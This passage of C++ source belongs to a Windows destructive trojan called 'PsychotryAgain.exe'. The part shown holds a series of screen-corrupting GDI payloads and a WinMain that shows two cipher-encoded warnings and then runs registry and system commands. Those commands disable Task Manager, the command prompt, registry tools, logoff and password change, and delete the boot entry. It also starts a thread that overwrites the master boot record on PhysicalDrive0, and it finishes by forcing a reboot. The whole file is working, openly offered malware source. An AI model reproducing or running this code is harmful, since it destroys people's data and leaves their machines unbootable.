			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload16

DWORD WINAPI gdi16(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g ^ i), (prgbScreen[i * szScreen.cy + j].r & j), (prgbScreen[i].b > i / 50)) * 25;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload17

DWORD WINAPI gdi17(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g | i / 15), (prgbScreen[i * szScreen.cx + j].g & j / 5), (prgbScreen[i * szScreen.cx + j].b > t));
				}
			}
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					int temp1 = (i + rand() % 20 - 5);
					if (temp1 < 0)
					{
						temp1 = -temp1;
					}
					int temp2 = (j + rand() % 25 - 10);
					if (temp2 < 0)
					{
						temp2 = -temp2;
					}
					prgbScreen[i * szScreen.cx + j].rgb = prgbScreen[(temp1 * szScreen.cx + temp2) % (szScreen.cx * szScreen.cy)].rgb;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(100);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload18

DWORD WINAPI gdi18(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g & i) % 7, (prgbScreen[i].r ^ j), (prgbScreen[i].b >> i / 70)) * t;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload19

DWORD WINAPI gdi19(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g | i / 10) % 512, (prgbScreen[i * szScreen.cx + j].b | j / 20) % 555, (prgbScreen[i * szScreen.cx + j].b > t) % 666);
				}
			}
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					int temp1 = (i + 10);
					if (temp1 < 0)
					{
						temp1 = -temp1;
					}
					int temp2 = (j - 40);
					if (temp2 < 0)
					{
						temp2 = -temp2;
					}
					prgbScreen[i * szScreen.cx + j].rgb = prgbScreen[(temp1 * szScreen.cx + temp2) % (szScreen.cx * szScreen.cy)].rgb;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(250);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload20

DWORD WINAPI gdi20(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g | i / 15) % 246, (prgbScreen[i * szScreen.cx + j].b | j / 25) % 206, (prgbScreen[i * szScreen.cx + j].b > t) % 456);
				}
			}
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					int temp1 = (i - 10);
					if (temp1 < 0)
					{
						temp1 = -temp1;
					}
					int temp2 = (j + 30);
					if (temp2 < 0)
					{
						temp2 = -temp2;
					}
					prgbScreen[i * szScreen.cx + j].rgb = prgbScreen[(temp1 * szScreen.cx + temp2) % (szScreen.cx * szScreen.cy)].rgb;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(250);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload21

DWORD WINAPI gdi21(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g ^ i), (prgbScreen[i].r & j), (prgbScreen[i * szScreen.cx + j].b * i));
				}
			}
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					int temp1 = (i + rand() % 70);
					if (temp1 < 0)
					{
						temp1 = -temp1;
					}
					int temp2 = (j + 27);
					if (temp2 < 0)
					{
						temp2 = -temp2;
					}
					prgbScreen[i * szScreen.cx + j].rgb = prgbScreen[(temp1 * szScreen.cx + temp2) % (szScreen.cx * szScreen.cy)].rgb;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(100);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

void reg_add( //credits to Mist0090
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

LPCWSTR generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1];  // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI TextProc(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 26 + 26), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 32768, &Bytes, NULL);
	return 1;
}

DWORD WINAPI notepad(LPVOID lpParam)
{
	const CHAR note[] = "No Skidded Malware Created By Underwater Tiny Kong  (@UnderwaterTinyKong/@UnderwaterTinyKongv2) & Arturs12 (@Arturs887), So Greatest Malware!!!!!!!!!!, My New No Skid Malware (PsychotryAgain.exe) Rate: 10/10!, Like & Subscribe To My Channel (@UnderwaterTinyKong/@UnderwaterTinyKongv2): Yes!, x0ranix/Elias201478/KozaResponding2/x0rUnRe2xxide Will Be Eating Poop!";
	CreateDirectoryA("C:\\NoSkid", 0);
	HANDLE hCreateNote = CreateFileW((LPCWSTR)L"C:\\NoSkid\\note.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCreateNote != INVALID_HANDLE_VALUE)
	{
		DWORD word;
		if (note == INVALID_HANDLE_VALUE) {
			MessageBox(NULL, L"x0ranix/Elias201478/KozaResponding2/x0rUnRe2xxide Will Be Eating Poop!", L"PsychotryAgain.exe", MB_ICONEXCLAMATION); //fallback msgbox
			Sleep(-1);
		}
		//ExitProcess(4);
		if (!WriteFile(hCreateNote, note, lstrlenA(note), &word, NULL)) {
			MessageBox(NULL, L"x0ranix/Elias201478/KozaResponding2/x0rUnRe2xxide Will Be Eating Poop!", L"PsychotryAgain.exe", MB_ICONEXCLAMATION); //fallback msgbox
			Sleep(-1);
		}
		//ExitProcess(5);
		CloseHandle(hCreateNote);
		ShellExecuteA(NULL, NULL, "notepad", "C:\\NoSkid\\note.txt", NULL, SW_SHOWDEFAULT);
	}
	return 0;
}

DWORD WINAPI good(LPVOID lpParam)
{
	CreateDirectoryA("C:\\PSYCHO", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\PSYCHO\\ULTRADASHER965ISBAD.wmv", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, HorseVid, 3111407, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);
	ShellExecute(0, 0, L"C:\\PSYCHO\\ULTRADASHER965ISBAD.wmv", 0, 0, SW_SHOW);
	return 0;
}

DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}


int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	//WARNING

	if (MessageBox(NULL, L"Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz PsychotryAgain aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong  (@UnderwaterTinyKong/@UnderwaterTinyKongv2) & Arturs12 (@Arturs887)) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz?", L"PsychotryAgain.exe (noskid)", MB_ICONWARNING | MB_YESNO) != IDYES)
		exit(1);

	if (MessageBox(NULL, L"Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong  (@UnderwaterTinyKong/@UnderwaterTinyKongv2) & Arturs12 (@Arturs887)) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu.", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷", MB_ICONWARNING | MB_YESNO) != IDYES)
		exit(1);
	//Default GDI

	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
	CreateThread(0, 0, KillMBR, 0, 0, 0);
	Sleep(2500);
	CreateThread(0, 0, notepad, 0, 0, 0);
	Sleep(3000);
	CreateThread(0, 0, notaskbar, 0, 0, 0);
	CreateThread(0, 0, good, 0, 0, 0);
	Sleep(15000);

	CreateThread(0, 0, sound, 0, 0, 0);
	CreateThread(0, 0, garbled, 0, 0, 0);
	CreateThread(0, 0, cursor, 0, 0, 0);

	HANDLE payload1 = CreateThread(0, 0, gdi1, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload1, 0);
	CloseHandle(payload1);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload2 = CreateThread(0, 0, gdi2, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload2, 0);
	CloseHandle(payload2);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload3 = CreateThread(0, 0, gdi3, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload3, 0);
	CloseHandle(payload3);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload4 = CreateThread(0, 0, gdi4, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload4, 0);
	CloseHandle(payload4);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload5 = CreateThread(0, 0, gdi5, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload5, 0);
	CloseHandle(payload5);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload6 = CreateThread(0, 0, gdi6, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload6, 0);
	CloseHandle(payload6);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload7 = CreateThread(0, 0, gdi7, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload7, 0);
	CloseHandle(payload7);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload8 = CreateThread(0, 0, gdi8, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload8, 0);
	CloseHandle(payload8);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload9 = CreateThread(0, 0, gdi9, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload9, 0);
	CloseHandle(payload9);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload10 = CreateThread(0, 0, gdi10, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload10, 0);
	CloseHandle(payload10);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload11 = CreateThread(0, 0, gdi11, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload11, 0);
	CloseHandle(payload11);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload12 = CreateThread(0, 0, gdi12, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload12, 0);
	CloseHandle(payload12);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload13 = CreateThread(0, 0, gdi13, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload13, 0);
	CloseHandle(payload13);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload14 = CreateThread(0, 0, gdi14, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload14, 0);
	CloseHandle(payload14);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload15 = CreateThread(0, 0, gdi15, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload15, 0);
	CloseHandle(payload15);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload16 = CreateThread(0, 0, gdi16, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload16, 0);
	CloseHandle(payload16);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload17 = CreateThread(0, 0, gdi17, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload17, 0);
	CloseHandle(payload17);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload18 = CreateThread(0, 0, gdi18, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload18, 0);
	CloseHandle(payload18);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload19 = CreateThread(0, 0, gdi19, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload19, 0);
	CloseHandle(payload19);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload20 = CreateThread(0, 0, gdi20, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload20, 0);
	CloseHandle(payload20);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	HANDLE payload21 = CreateThread(0, 0, gdi21, 0, 0, 0);
	Sleep(10000);
	TerminateThread(payload21, 0);
	CloseHandle(payload21);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	//Sleep(10000); //GDI TESTING TIMER
	system("shutdown.exe /r /t 00");
	exit(1);
}